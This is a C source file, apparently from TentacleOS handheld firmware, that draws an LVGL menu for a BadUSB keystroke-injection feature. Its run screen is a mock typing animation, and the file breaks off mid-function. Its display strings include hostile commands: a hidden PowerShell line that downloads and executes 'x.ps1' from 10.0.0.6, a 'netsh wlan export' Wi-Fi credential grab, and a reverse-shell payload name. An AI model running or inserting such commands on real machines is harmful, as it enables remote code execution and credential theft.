// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "badusb_menu_ui.h"

#include <stdio.h>
#include <string.h>

#include "esp_log.h"
#include "lvgl.h"
#include "st7789.h"

#include "buttons_gpio.h"
#include "menu_component_ui.h"
#include "ui_chrome.h"
#include "ui_feedback.h"
#include "ui_manager.h"
#include "ui_theme.h"
#include "waves_ui.h"

static const char *TAG = "BADUSB_UI";

#define NAV_TIMER_MS 50

#define OUTER_BORDER           4
#define TOP_BORDER_H           46
#define TOP_AREA_BORDER_WIDTH  3
#define TITLE_BAR_W            170
#define TITLE_BAR_H            30
#define TITLE_BAR_RADIUS       12
#define TITLE_BAR_BORDER_WIDTH 2

#define TERM_GREEN       0x00E676
#define TERM_DIM_GREEN   0x1F7A52
#define DARK_PANEL_COLOR 0x05090A

#define FADE_MS 200

#define STATUS_Y_OFS (TOP_BORDER_H + 12)

#define RUN_HEADER_TITLE   "BADUSB"
#define RUN_HEADER_TITLE_Y 10
#define RUN_RULE_W_PCT     70
#define RUN_RULE_H         2
#define RUN_RULE_Y         32

#define DOT_COUNT      3
#define DOT_SIZE       10
#define DOT_GAP        18
#define DOT_Y_OFS      64
#define DOT_PULSE_MS   480
#define DOT_STAGGER_MS 160

#define DETECT_MS       1400
#define DONE_DELAY_MS   500
#define STATUS_BLINK_MS 650

#define TERMINAL_W      216
#define TERMINAL_H      138
#define TERMINAL_TOP_Y  84
#define TERMINAL_PAD    8
#define TERMINAL_RADIUS 0
#define TERMINAL_BORDER 2
#define TERM_HEADER_Y   0
#define TERM_BODY_Y     18

#define TYPE_TICK_MS       42
#define CURSOR_BLINK_TICKS 9

#define DELIVERY_W            214
#define DELIVERY_H            36
#define DELIVERY_Y            46
#define DELIVERY_NODE_W       40
#define DELIVERY_NODE_H       30
#define DELIVERY_TRACK_H      2
#define DELIVERY_PACKET       8
#define DELIVERY_PACKET_COUNT 3
#define DELIVERY_TRAVEL_MS    900
#define DELIVERY_STAGGER_MS   300

#define PROGRESS_W           214
#define PROGRESS_H           8
#define PROGRESS_Y           252
#define PROGRESS_RADIUS      4
#define PROGRESS_TRACK_COLOR 0x10211A
#define PCT_LABEL_Y          230
#define PCT_LABEL_TEXT       "Transferring payload"

#define CONFIRM_Y_OFS  -28
#define INSTRUCT_Y_OFS -8

#define TERMINAL_BUF_LEN 320

#define TERM_PROMPT   "root@target:~#"
#define DETECT_STATUS "Detecting target"
#define CONFIRM_TEXT  LV_SYMBOL_OK "  Payload delivered"
#define INSTRUCT_TEXT "RIGHT = Run again   BACK = Exit"

#define LAYOUT_ACTIVE_DEFAULT 4
#define SIG_GREEN             0x00E676

#define INFO_PANEL_W       200
#define INFO_PANEL_H       120
#define INFO_PANEL_RADIUS  10
#define INFO_ROW_GAP       24
#define INFO_FIRST_ROW_Y   14
#define INFO_LABEL_X       12
#define STATUS_FOOTER_HINT "BACK exit"

#define PAY_LIST_TOP      46
#define PAY_LIST_W        216
#define PAY_LIST_H        150
#define PAY_ROW_H         26
#define PAY_ROW_GAP       4
#define PAY_KEY_SZ        20
#define PAY_KEY_RADIUS    6
#define PAY_ROW_RADIUS    8
#define PAY_GLOW_W        14
#define PAY_PREVIEW_W     216
#define PAY_PREVIEW_H     92
#define PAY_PREVIEW_BOT   26
#define PAY_PREVIEW_RAD   8
#define PAY_PREVIEW_PAD   8
#define PAY_KEY_TINT_OPA  LV_OPA_20
#define PAY_BODY_BUF_LEN  160
#define PREVIEW_MAX_LINES 4

static const struct {
  const char *name;
  const char *icon;
} MENU_ITEMS[] = {
    {"Run Payload", "/assets/icons/play_arrow.bin"},
    {"Payloads", "/assets/icons/description.bin"},
    {"Keyboard Layout", "/assets/icons/keyboard.bin"},
    {"USB Status", "/assets/icons/usb.bin"},
    {"HID Mouse", "/assets/icons/usb.bin"},
};
#define MENU_ITEM_COUNT ((int)(sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0])))

#define IDX_RUN_PAYLOAD 0
#define IDX_PAYLOADS    1
#define IDX_LAYOUT      2
#define IDX_STATUS      3
#define IDX_MOUSE       4

static const char *PAYLOADS[] = {
    "rickroll.duck",
    "wifi_grab.duck",
    "lock_pc.duck",
    "hello_world.duck",
    "reverse_shell.duck",
};
#define PAYLOAD_COUNT ((int)(sizeof(PAYLOADS) / sizeof(PAYLOADS[0])))

static const char *SCRIPT_LINES[] = {
    "$ delay 500",
    "$ GUI r",
    "$ powershell -nop -w hidden",
    "$ iwr http://10.0.0.6/x.ps1 | iex",
    "$ payload staged",
    "$ done.",
};
#define SCRIPT_LINE_COUNT ((int)(sizeof(SCRIPT_LINES) / sizeof(SCRIPT_LINES[0])))

static const struct {
  const char *base;
  const char *size;
  const char *lines[PREVIEW_MAX_LINES];
  int line_count;
} PAYLOAD_PREVIEW[PAYLOAD_COUNT] = {
    {"rickroll", "1.2 KB", {"GUI r", "STRING chrome youtu.be/dQw4", "ENTER"}, 3},
    {"wifi_grab", "0.8 KB", {"GUI r", "STRING cmd /k netsh wlan export", "ENTER"}, 3},
    {"lock_pc", "0.3 KB", {"DELAY 200", "GUI l"}, 2},
    {"hello_world", "0.2 KB", {"STRING Hello, World!", "ENTER"}, 2},
    {"reverse_shell",
     "2.1 KB",
     {"GUI r", "STRING powershell -nop -w hidden", "DELAY 300", "ENTER"},
     4},
};

static const char *LAYOUTS[] = {"US", "UK", "DE", "FR", "BR"};
#define LAYOUT_COUNT ((int)(sizeof(LAYOUTS) / sizeof(LAYOUTS[0])))

static const struct {
  const char *label;
  const char *value;
} STATUS_ROWS[] = {
    {"USB", "HID Keyboard"},
    {"VID:PID", "046D:C31C"},
    {"Speed", "Full"},
    {"State", "Ready"},
};
#define STATUS_ROW_COUNT ((int)(sizeof(STATUS_ROWS) / sizeof(STATUS_ROWS[0])))

typedef enum {
  RUN_STAGE_DETECTING = 0,
  RUN_STAGE_TYPING,
  RUN_STAGE_DONE,
} run_stage_t;

typedef enum {
  VIEW_LIST = 0,
  VIEW_PAYLOADS,
  VIEW_RUNNING,
  VIEW_LAYOUT,
  VIEW_STATUS,
} view_t;

static lv_obj_t *s_screen = NULL;
static menu_component_t s_menu;
static view_t s_view = VIEW_LIST;

static lv_timer_t *s_nav_timer = NULL;
static lv_timer_t *s_stage_timer = NULL;
static lv_timer_t *s_type_timer = NULL;

static int s_payload_sel = 0;
static int s_layout_active = LAYOUT_ACTIVE_DEFAULT;

static lv_obj_t *s_pay_rows[PAYLOAD_COUNT];
static lv_obj_t *s_pay_prev_title = NULL;
static lv_obj_t *s_pay_prev_body = NULL;

static run_stage_t s_run_stage = RUN_STAGE_DETECTING;
static lv_obj_t *s_status_lbl = NULL;
static lv_obj_t *s_detect_group = NULL;
static lv_obj_t *s_delivery_group = NULL;
static lv_obj_t *s_term_lbl = NULL;
static lv_obj_t *s_progress = NULL;
static lv_obj_t *s_pct_lbl = NULL;

static char s_term_buf[TERMINAL_BUF_LEN];
static int s_type_line = 0;
static int s_type_col = 0;
static int s_typed_chars = 0;
static int s_total_chars = 0;
static int s_cursor_ticks = 0;
static bool s_cursor_on = true;

static bool s_up_last = false;
static bool s_down_last = false;
static bool s_left_last = false;
static bool s_right_last = false;
static bool s_ok_last = false;
static bool s_back_last = false;

static void nav_timer_cb(lv_timer_t *t);
static void build_screen(void);
static void stage_advance_cb(lv_timer_t *t);
static void type_tick_cb(lv_timer_t *t);

static void stop_stage_timer(void) {
  if (s_stage_timer != NULL) {
    lv_timer_delete(s_stage_timer);
    s_stage_timer = NULL;
  }
}

static void stop_type_timer(void) {
  if (s_type_timer != NULL) {
    lv_timer_delete(s_type_timer);
    s_type_timer = NULL;
  }
}

static void opa_anim_cb(void *var, int32_t v) {
  lv_obj_set_style_opa((lv_obj_t *)var, (lv_opa_t)v, 0);
}

static void translate_x_cb(void *var, int32_t v) {
  lv_obj_set_style_translate_x((lv_obj_t *)var, v, 0);
}

static void fade_in(lv_obj_t *obj, uint32_t duration_ms) {
  lv_obj_set_style_opa(obj, LV_OPA_TRANSP, 0);
  lv_anim_t a;
  lv_anim_init(&a);
  lv_anim_set_var(&a, obj);
  lv_anim_set_exec_cb(&a, opa_anim_cb);
  lv_anim_set_values(&a, LV_OPA_TRANSP, LV_OPA_COVER);
  lv_anim_set_duration(&a, duration_ms);
  lv_anim_set_path_cb(&a, lv_anim_path_ease_out);
  lv_anim_start(&a);
}

static void build_running_header(void) {
  lv_obj_t *title = lv_label_create(s_screen);
  lv_label_set_text(title, RUN_HEADER_TITLE);
  lv_obj_set_style_text_color(title, current_theme.border_accent, 0);
  lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);
  lv_obj_align(title, LV_ALIGN_TOP_MID, 0, RUN_HEADER_TITLE_Y);

  lv_obj_t *rule = lv_obj_create(s_screen);
  lv_obj_remove_flag(rule, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_remove_flag(rule, LV_OBJ_FLAG_CLICKABLE);
  lv_obj_set_size(rule, lv_pct(RUN_RULE_W_PCT), RUN_RULE_H);
  lv_obj_align(rule, LV_ALIGN_TOP_MID, 0, RUN_RULE_Y);
  lv_obj_set_style_border_width(rule, 0, 0);
  lv_obj_set_style_radius(rule, 1, 0);
  lv_obj_set_style_bg_color(rule, current_theme.border_accent, 0);
  lv_obj_set_style_bg_opa(rule, LV_OPA_40, 0);
}

static void build_title(const char *text) {
  lv_obj_t *top_area = lv_obj_create(s_screen);
  lv_obj_set_size(top_area, LCD_H_RES - OUTER_BORDER * 2, TOP_BORDER_H);
  lv_obj_align(top_area, LV_ALIGN_TOP_MID, 0, 0);
  lv_obj_remove_flag(top_area, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_style_bg_opa(top_area, LV_OPA_TRANSP, 0);
  lv_obj_set_style_border_width(top_area, TOP_AREA_BORDER_WIDTH, 0);
  lv_obj_set_style_border_color(top_area, current_theme.border_interface, 0);
  lv_obj_set_style_border_side(top_area, LV_BORDER_SIDE_BOTTOM, 0);
  lv_obj_set_style_radius(top_area, 0, 0);
  lv_obj_set_style_pad_all(top_area, 0, 0);

  lv_obj_t *title_bar = lv_obj_create(top_area);
  lv_obj_set_size(title_bar, TITLE_BAR_W, TITLE_BAR_H);
  lv_obj_align(title_bar, LV_ALIGN_CENTER, 0, 0);
  lv_obj_remove_flag(title_bar, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_style_radius(title_bar, TITLE_BAR_RADIUS, 0);
  lv_obj_set_style_bg_opa(title_bar, LV_OPA_COVER, 0);
  lv_obj_set_style_bg_color(title_bar, current_theme.bg_primary, 0);
  lv_obj_set_style_bg_grad_color(title_bar, current_theme.bg_secondary, 0);
  lv_obj_set_style_bg_grad_dir(title_bar, LV_GRAD_DIR_HOR, 0);
  lv_obj_set_style_border_width(title_bar, TITLE_BAR_BORDER_WIDTH, 0);
  lv_obj_set_style_border_color(title_bar, current_theme.border_accent, 0);

  lv_obj_t *title_lbl = lv_label_create(title_bar);
  lv_label_set_text(title_lbl, text);
  lv_obj_set_style_text_color(title_lbl, current_theme.text_main, 0);
  lv_obj_set_style_text_font(title_lbl, &lv_font_montserrat_14, 0);
  lv_obj_center(title_lbl);
}

static void build_detecting(void) {
  s_status_lbl = lv_label_create(s_screen);
  lv_label_set_text(s_status_lbl, DETECT_STATUS);
  lv_obj_set_style_text_color(s_status_lbl, current_theme.text_main, 0);
  lv_obj_set_style_text_font(s_status_lbl, &lv_font_montserrat_14, 0);
  lv_obj_align(s_status_lbl, LV_ALIGN_TOP_MID, 0, STATUS_Y_OFS);

  lv_anim_t blink;
  lv_anim_init(&blink);
  lv_anim_set_var(&blink, s_status_lbl);
  lv_anim_set_exec_cb(&blink, opa_anim_cb);
  lv_anim_set_values(&blink, LV_OPA_40, LV_OPA_COVER);
  lv_anim_set_duration(&blink, STATUS_BLINK_MS);
  lv_anim_set_playback_duration(&blink, STATUS_BLINK_MS);
  lv_anim_set_repeat_count(&blink, LV_ANIM_REPEAT_INFINITE);
  lv_anim_set_path_cb(&blink, lv_anim_path_ease_in_out);
  lv_anim_start(&blink);

  s_detect_group = lv_obj_create(s_screen);
  lv_obj_remove_flag(s_detect_group, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_size(s_detect_group, lv_pct(100), lv_pct(100));
  lv_obj_align(s_detect_group, LV_ALIGN_CENTER, 0, 0);
  lv_obj_set_style_bg_opa(s_detect_group, LV_OPA_TRANSP, 0);
  lv_obj_set_style_border_width(s_detect_group, 0, 0);
  lv_obj_set_style_pad_all(s_detect_group, 0, 0);

  waves_create(s_detect_group, LV_ALIGN_CENTER, 0, 0, NULL, "/assets/icons/usb.bin");

  int total_w = DOT_COUNT * DOT_SIZE + (DOT_COUNT - 1) * DOT_GAP;
  int x0 = -(total_w / 2) + DOT_SIZE / 2;
  for (int i = 0; i < DOT_COUNT; i++) {
    lv_obj_t *dot = lv_obj_create(s_detect_group);
    lv_obj_remove_flag(dot, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_size(dot, DOT_SIZE, DOT_SIZE);
    lv_obj_align(dot, LV_ALIGN_CENTER, x0 + i * (DOT_SIZE + DOT_GAP), DOT_Y_OFS);
    lv_obj_set_style_radius(dot, LV_RADIUS_CIRCLE, 0);
    lv_obj_set_style_border_width(dot, 0, 0);
    lv_obj_set_style_bg_opa(dot, LV_OPA_COVER, 0);
    lv_obj_set_style_bg_color(dot, current_theme.border_accent, 0);

    lv_anim_t a;
    lv_anim_init(&a);
    lv_anim_set_var(&a, dot);
    lv_anim_set_exec_cb(&a, opa_anim_cb);
    lv_anim_set_values(&a, LV_OPA_30, LV_OPA_COVER);
    lv_anim_set_duration(&a, DOT_PULSE_MS);
    lv_anim_set_playback_duration(&a, DOT_PULSE_MS);
    lv_anim_set_delay(&a, i * DOT_STAGGER_MS);
    lv_anim_set_repeat_count(&a, LV_ANIM_REPEAT_INFINITE);
    lv_anim_set_path_cb(&a, lv_anim_path_ease_in_out);
    lv_anim_start(&a);
  }
}

static void build_terminal(void) {
  lv_obj_t *panel = lv_obj_create(s_screen);
  lv_obj_remove_flag(panel, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_size(panel, TERMINAL_W, TERMINAL_H);
  lv_obj_align(panel, LV_ALIGN_TOP_MID, 0, TERMINAL_TOP_Y);
  lv_obj_set_style_radius(panel, TERMINAL_RADIUS, 0);
  lv_obj_set_style_bg_opa(panel, LV_OPA_COVER, 0);
  lv_obj_set_style_bg_color(panel, lv_color_hex(DARK_PANEL_COLOR), 0);
  lv_obj_set_style_border_width(panel, TERMINAL_BORDER, 0);
  lv_obj_set_style_border_color(panel, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_border_opa(panel, LV_OPA_70, 0);
  lv_obj_set_style_shadow_color(panel, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_shadow_width(panel, 12, 0);
  lv_obj_set_style_shadow_opa(panel, LV_OPA_20, 0);
  lv_obj_set_style_pad_all(panel, TERMINAL_PAD, 0);

  lv_obj_t *prompt = lv_label_create(panel);
  lv_label_set_text(prompt, TERM_PROMPT);
  lv_obj_set_style_text_color(prompt, lv_color_hex(TERM_DIM_GREEN), 0);
  lv_obj_set_style_text_font(prompt, &lv_font_montserrat_12, 0);
  lv_obj_align(prompt, LV_ALIGN_TOP_LEFT, 0, TERM_HEADER_Y);

  s_term_lbl = lv_label_create(panel);
  lv_label_set_text(s_term_lbl, "");
  lv_obj_set_width(s_term_lbl, TERMINAL_W - TERMINAL_PAD * 2);
  lv_label_set_long_mode(s_term_lbl, LV_LABEL_LONG_WRAP);
  lv_obj_set_style_text_color(s_term_lbl, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_text_font(s_term_lbl, &lv_font_montserrat_12, 0);
  lv_obj_align(s_term_lbl, LV_ALIGN_TOP_LEFT, 0, TERM_BODY_Y);

  s_pct_lbl = lv_label_create(s_screen);
  lv_label_set_text(s_pct_lbl, PCT_LABEL_TEXT "   0%");
  lv_obj_set_style_text_color(s_pct_lbl, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_text_font(s_pct_lbl, &lv_font_montserrat_12, 0);
  lv_obj_align(s_pct_lbl, LV_ALIGN_TOP_MID, 0, PCT_LABEL_Y);

  s_progress = lv_bar_create(s_screen);
  lv_obj_set_size(s_progress, PROGRESS_W, PROGRESS_H);
  lv_obj_align(s_progress, LV_ALIGN_TOP_MID, 0, PROGRESS_Y);
  lv_bar_set_range(s_progress, 0, 100);
  lv_bar_set_value(s_progress, 0, LV_ANIM_OFF);
  lv_obj_set_style_bg_color(s_progress, lv_color_hex(PROGRESS_TRACK_COLOR), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(s_progress, LV_OPA_COVER, LV_PART_MAIN);
  lv_obj_set_style_border_width(s_progress, 1, LV_PART_MAIN);
  lv_obj_set_style_border_color(s_progress, lv_color_hex(TERM_DIM_GREEN), LV_PART_MAIN);
  lv_obj_set_style_bg_color(s_progress, lv_color_hex(TERM_DIM_GREEN), LV_PART_INDICATOR);
  lv_obj_set_style_bg_grad_color(s_progress, lv_color_hex(TERM_GREEN), LV_PART_INDICATOR);
  lv_obj_set_style_bg_grad_dir(s_progress, LV_GRAD_DIR_HOR, LV_PART_INDICATOR);
  lv_obj_set_style_bg_opa(s_progress, LV_OPA_COVER, LV_PART_INDICATOR);
  lv_obj_set_style_radius(s_progress, PROGRESS_RADIUS, LV_PART_MAIN);
  lv_obj_set_style_radius(s_progress, PROGRESS_RADIUS, LV_PART_INDICATOR);
}

static void build_delivery(void) {
  s_delivery_group = lv_obj_create(s_screen);
  lv_obj_remove_flag(s_delivery_group, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_size(s_delivery_group, DELIVERY_W, DELIVERY_H);
  lv_obj_align(s_delivery_group, LV_ALIGN_TOP_MID, 0, DELIVERY_Y);
  lv_obj_set_style_bg_opa(s_delivery_group, LV_OPA_TRANSP, 0);
  lv_obj_set_style_border_width(s_delivery_group, 0, 0);
  lv_obj_set_style_pad_all(s_delivery_group, 0, 0);

  int track_x0 = DELIVERY_NODE_W;
  int track_x1 = DELIVERY_W - DELIVERY_NODE_W;
  int track_len = track_x1 - track_x0;

  lv_obj_t *track = lv_obj_create(s_delivery_group);
  lv_obj_remove_flag(track, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_size(track, track_len, DELIVERY_TRACK_H);
  lv_obj_align(track, LV_ALIGN_LEFT_MID, track_x0, 0);
  lv_obj_set_style_border_width(track, 0, 0);
  lv_obj_set_style_radius(track, 1, 0);
  lv_obj_set_style_bg_color(track, current_theme.border_accent, 0);
  lv_obj_set_style_bg_opa(track, LV_OPA_30, 0);

  const char *NODE_TEXT[2] = {"HOST", "HID"};
  for (int n = 0; n < 2; n++) {
    lv_obj_t *node = lv_obj_create(s_delivery_group);
    lv_obj_remove_flag(node, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_size(node, DELIVERY_NODE_W, DELIVERY_NODE_H);
    lv_obj_align(node, n == 0 ? LV_ALIGN_LEFT_MID : LV_ALIGN_RIGHT_MID, 0, 0);
    lv_obj_set_style_radius(node, 4, 0);
    lv_obj_set_style_pad_all(node, 0, 0);
    lv_obj_set_style_bg_color(node, current_theme.bg_secondary, 0);
    lv_obj_set_style_bg_opa(node, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(node, 1, 0);
    lv_obj_set_style_border_color(node, current_theme.border_accent, 0);

    lv_obj_t *lbl = lv_label_create(node);
    lv_label_set_text(lbl, NODE_TEXT[n]);
    lv_obj_set_style_text_color(lbl, current_theme.text_main, 0);
    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(lbl);
  }

  for (int i = 0; i < DELIVERY_PACKET_COUNT; i++) {
    lv_obj_t *pkt = lv_obj_create(s_delivery_group);
    lv_obj_remove_flag(pkt, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_size(pkt, DELIVERY_PACKET, DELIVERY_PACKET);
    lv_obj_align(pkt, LV_ALIGN_LEFT_MID, track_x0, 0);
    lv_obj_set_style_radius(pkt, 2, 0);
    lv_obj_set_style_border_width(pkt, 0, 0);
    lv_obj_set_style_bg_color(pkt, lv_color_hex(TERM_GREEN), 0);
    lv_obj_set_style_bg_opa(pkt, LV_OPA_COVER, 0);
    lv_obj_set_style_shadow_color(pkt, lv_color_hex(TERM_GREEN), 0);
    lv_obj_set_style_shadow_width(pkt, 6, 0);
    lv_obj_set_style_shadow_opa(pkt, LV_OPA_50, 0);

    lv_anim_t a;
    lv_anim_init(&a);
    lv_anim_set_var(&a, pkt);
    lv_anim_set_exec_cb(&a, translate_x_cb);
    lv_anim_set_values(&a, 0, track_len - DELIVERY_PACKET);
    lv_anim_set_duration(&a, DELIVERY_TRAVEL_MS);
    lv_anim_set_delay(&a, i * DELIVERY_STAGGER_MS);
    lv_anim_set_repeat_count(&a, LV_ANIM_REPEAT_INFINITE);
    lv_anim_set_path_cb(&a, lv_anim_path_ease_in_out);
    lv_anim_start(&a);
  }
}

static void render_terminal(void) {
  s_term_buf[0] = '\0';
  int pos = 0;
  for (int i = 0; i < s_type_line && i < SCRIPT_LINE_COUNT; i++) {
    pos += snprintf(s_term_buf + pos, TERMINAL_BUF_LEN - pos, "%s\n", SCRIPT_LINES[i]);
    if (pos >= TERMINAL_BUF_LEN)
      pos = TERMINAL_BUF_LEN - 1;
  }
  if (s_type_line < SCRIPT_LINE_COUNT) {
    pos += snprintf(
        s_term_buf + pos, TERMINAL_BUF_LEN - pos, "%.*s", s_type_col, SCRIPT_LINES[s_type_line]);
    if (pos >= TERMINAL_BUF_LEN)
      pos = TERMINAL_BUF_LEN - 1;
  }
  if (s_cursor_on && pos < TERMINAL_BUF_LEN - 2) {
    s_term_buf[pos++] = '_';
    s_term_buf[pos] = '\0';
  }
  if (s_term_lbl)
    lv_label_set_text(s_term_lbl, s_term_buf);
}

static void type_tick_cb(lv_timer_t *t) {
  if (lv_screen_active() != s_screen || s_view != VIEW_RUNNING) {
    lv_timer_delete(t);
    s_type_timer = NULL;
    return;
  }

  s_cursor_ticks++;
  if (s_cursor_ticks >= CURSOR_BLINK_TICKS) {
    s_cursor_ticks = 0;
    s_cursor_on = !s_cursor_on;
  }

  if (s_type_line < SCRIPT_LINE_COUNT) {
    int line_len = (int)strlen(SCRIPT_LINES[s_type_line]);
    if (s_type_col < line_len) {
      s_type_col++;
      s_typed_chars++;
    } else {
      s_type_line++;
      s_type_col = 0;
    }
    if (s_total_chars > 0) {
      int pct = s_typed_chars * 100 / s_total_chars;
      if (s_progress)
        lv_bar_set_value(s_progress, pct, LV_ANIM_OFF);
      if (s_pct_lbl) {
        char buf[40];
        snprintf(buf, sizeof(buf), "%s   %d%%", PCT_LABEL_TEXT, pct);
        lv_label_set_text(s_pct_lbl, buf);
      }
    }
    render_terminal();
  } else {
    render_terminal();
    lv_timer_delete(t);
    s_type_timer = NULL;
    if (s_progress)
      lv_bar_set_value(s_progress, 100, LV_ANIM_ON);
    if (s_pct_lbl)
      lv_label_set_text(s_pct_lbl, PCT_LABEL_TEXT "   100%");
    s_run_stage = RUN_STAGE_DONE;
    s_stage_timer = lv_timer_create(stage_advance_cb, DONE_DELAY_MS, NULL);
    lv_timer_set_repeat_count(s_stage_timer, 1);
  }
}

static void enter_stage_typing(void) {
  if (s_detect_group != NULL) {
    lv_obj_del(s_detect_group);
    s_detect_group = NULL;
  }
  if (s_status_lbl != NULL) {
    lv_obj_del(s_status_lbl);
    s_status_lbl = NULL;
  }

  s_type_line = 0;
  s_type_col = 0;
  s_typed_chars = 0;
  s_cursor_ticks = 0;
  s_cursor_on = true;
  s_total_chars = 0;
  for (int i = 0; i < SCRIPT_LINE_COUNT; i++)
    s_total_chars += (int)strlen(SCRIPT_LINES[i]);

  build_delivery();
  build_terminal();
  render_terminal();
  fade_in(s_term_lbl, FADE_MS);

  s_type_timer = lv_timer_create(type_tick_cb, TYPE_TICK_MS, NULL);
}

static void show_done(void) {
  if (s_delivery_group != NULL) {
    lv_obj_del(s_delivery_group);
    s_delivery_group = NULL;
  }

  lv_obj_t *confirm = lv_label_create(s_screen);
  lv_label_set_text(confirm, CONFIRM_TEXT);
  lv_obj_set_style_text_color(confirm, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_text_font(confirm, &lv_font_montserrat_14, 0);
  lv_obj_align(confirm, LV_ALIGN_BOTTOM_MID, 0, CONFIRM_Y_OFS);
  fade_in(confirm, FADE_MS);

  ui_chrome_footer(s_screen, INSTRUCT_TEXT);

  ESP_LOGI(TAG, "mock payload run done: %s", PAYLOADS[s_payload_sel]);
  ui_feedback(UI_FB_WRITE);
}

static void stage_advance_cb(lv_timer_t *t) {
  (void)t;
  s_stage_timer = NULL;
  if (lv_screen_active() != s_screen || s_view != VIEW_RUNNING)
    return;

  if (s_run_stage == RUN_STAGE_DETECTING) {
    s_run_stage = RUN_STAGE_TYPING;
    enter_stage_typing();
    return;
  }

  if (s_run_stage == RUN_STAGE_DONE)
    show_done();
}

static void build_running(void) {
  ui_chrome_header(s_screen, "BADUSB", "/assets/icons/usb.bin");

  s_run_stage = RUN_STAGE_DETECTING;
  build_detecting();

  s_stage_timer = lv_timer_create(stage_advance_cb, DETECT_MS, NULL);
  lv_timer_set_repeat_count(s_stage_timer, 1);
}

static void pay_style_row(lv_obj_t *row, bool selected) {
  lv_obj_set_style_border_width(row, 1, 0);
  lv_obj_set_style_bg_opa(row, LV_OPA_COVER, 0);
  if (selected) {
    lv_obj_set_style_bg_color(row, current_theme.bg_secondary, 0);
    lv_obj_set_style_border_color(row, current_theme.border_accent, 0);
    lv_obj_set_style_border_opa(row, LV_OPA_COVER, 0);
    lv_obj_set_style_shadow_color(row, current_theme.border_accent, 0);
    lv_obj_set_style_shadow_width(row, PAY_GLOW_W, 0);
    lv_obj_set_style_shadow_opa(row, LV_OPA_40, 0);
    lv_obj_set_style_shadow_spread(row, -2, 0);
  } else {
    lv_obj_set_style_bg_color(row, current_theme.bg_primary, 0);
    lv_obj_set_style_border_color(row, current_theme.border_inactive, 0);
    lv_obj_set_style_border_opa(row, LV_OPA_COVER, 0);
    lv_obj_set_style_shadow_width(row, 0, 0);
    lv_obj_set_style_shadow_opa(row, LV_OPA_TRANSP, 0);
  }
}

static void pay_update_preview(int idx) {
  if (s_pay_prev_title != NULL) {
    char title[48];
    snprintf(title, sizeof(title), "// %s", PAYLOADS[idx]);
    lv_label_set_text(s_pay_prev_title, title);
  }
  if (s_pay_prev_body != NULL) {
    char body[PAY_BODY_BUF_LEN];
    int pos = 0;
    for (int i = 0; i < PAYLOAD_PREVIEW[idx].line_count && pos < PAY_BODY_BUF_LEN - 1; i++)
      pos += snprintf(body + pos,
                      PAY_BODY_BUF_LEN - pos,
                      "%s%s",
                      i == 0 ? "" : "\n",
                      PAYLOAD_PREVIEW[idx].lines[i]);
    lv_label_set_text(s_pay_prev_body, body);
  }
}

static void pay_apply_sel(int idx) {
  for (int i = 0; i < PAYLOAD_COUNT; i++)
    if (s_pay_rows[i] != NULL)
      pay_style_row(s_pay_rows[i], i == idx);
  pay_update_preview(idx);
}

static void build_payloads(void) {
  ui_chrome_header(s_screen, "PAYLOADS", "/assets/icons/description.bin");
  ui_chrome_footer(s_screen, "UP/DOWN pick   OK run   BACK back");

  if (s_payload_sel < 0)
    s_payload_sel = 0;
  if (s_payload_sel >= PAYLOAD_COUNT)
    s_payload_sel = PAYLOAD_COUNT - 1;

  lv_obj_t *list = lv_obj_create(s_screen);
  lv_obj_remove_flag(list, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_size(list, PAY_LIST_W, PAY_LIST_H);
  lv_obj_align(list, LV_ALIGN_TOP_MID, 0, PAY_LIST_TOP);
  lv_obj_set_style_bg_opa(list, LV_OPA_TRANSP, 0);
  lv_obj_set_style_border_width(list, 0, 0);
  lv_obj_set_style_pad_all(list, 0, 0);
  lv_obj_set_style_pad_row(list, PAY_ROW_GAP, 0);
  lv_obj_set_flex_flow(list, LV_FLEX_FLOW_COLUMN);
  lv_obj_set_flex_align(list, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START);

  for (int i = 0; i < PAYLOAD_COUNT; i++) {
    lv_obj_t *row = lv_obj_create(list);
    lv_obj_remove_flag(row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_size(row, lv_pct(100), PAY_ROW_H);
    lv_obj_set_style_radius(row, PAY_ROW_RADIUS, 0);
    lv_obj_set_style_pad_hor(row, 8, 0);
    lv_obj_set_style_pad_ver(row, 0, 0);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(row, 8, 0);

    lv_obj_t *key = lv_obj_create(row);
    lv_obj_remove_flag(key, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_size(key, PAY_KEY_SZ, PAY_KEY_SZ);
    lv_obj_set_style_radius(key, PAY_KEY_RADIUS, 0);
    lv_obj_set_style_pad_all(key, 0, 0);
    lv_obj_set_style_border_width(key, 0, 0);
